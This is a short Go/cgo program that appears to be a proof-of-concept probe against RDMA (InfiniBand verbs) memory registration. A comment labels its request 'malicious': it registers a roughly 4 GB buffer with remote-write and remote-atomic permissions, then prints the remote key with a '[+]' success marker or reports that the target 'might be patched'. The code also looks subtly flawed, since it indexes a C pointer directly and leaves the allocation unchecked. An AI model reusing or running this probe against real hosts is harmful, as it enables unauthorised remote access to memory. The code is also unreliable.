package main

/*
#cgo LDFLAGS: -libverbs
#include <infiniband/verbs.h>
#include <stdlib.h>
#include <string.h>

struct ibv_mr* register_mem(struct ibv_pd *pd, void *buf, size_t length, int access) {
    return ibv_reg_mr(pd, buf, length, access);
}
*/
import "C"
import (
    "fmt"
    "os"
    "unsafe"
)

func main() {
    // Open RDMA device
    list := C.ibv_get_device_list(nil)
    if list == nil {
        fmt.Println("No RDMA devices found")
        os.Exit(1)
    }
    ctx := C.ibv_open_device(list[0])
    if ctx == nil {
        fmt.Println("Failed to open RDMA device")
        os.Exit(1)
    }

    // Allocate protection domain
    pd := C.ibv_alloc_pd(ctx)
    if pd == nil {
        fmt.Println("Failed to alloc PD")
        os.Exit(1)
    }

    // Maliciously request huge length + overly permissive flags
    length := C.size_t(0xFFFFFFFF) // huge allocation request
    buf := C.malloc(length)
    access := C.int(C.IBV_ACCESS_LOCAL_WRITE |
                    C.IBV_ACCESS_REMOTE_WRITE |
                    C.IBV_ACCESS_REMOTE_ATOMIC)

    mr := C.register_mem(pd, buf, length, access)
    if mr == nil {
        fmt.Println("ibv_reg_mr failed — target might be patched")
    } else {
        fmt.Printf("[+] Registered MR: addr=%p, length=%d, lkey=%d, rkey=%d\n",
            mr.addr, mr.length, mr.lkey, mr.rkey)
    }

    // Cleanup
    if mr != nil {
        C.ibv_dereg_mr(mr)
    }
    C.free(unsafe.Pointer(buf))
    C.ibv_dealloc_pd(pd)
    C.ibv_close_device(ctx)
}
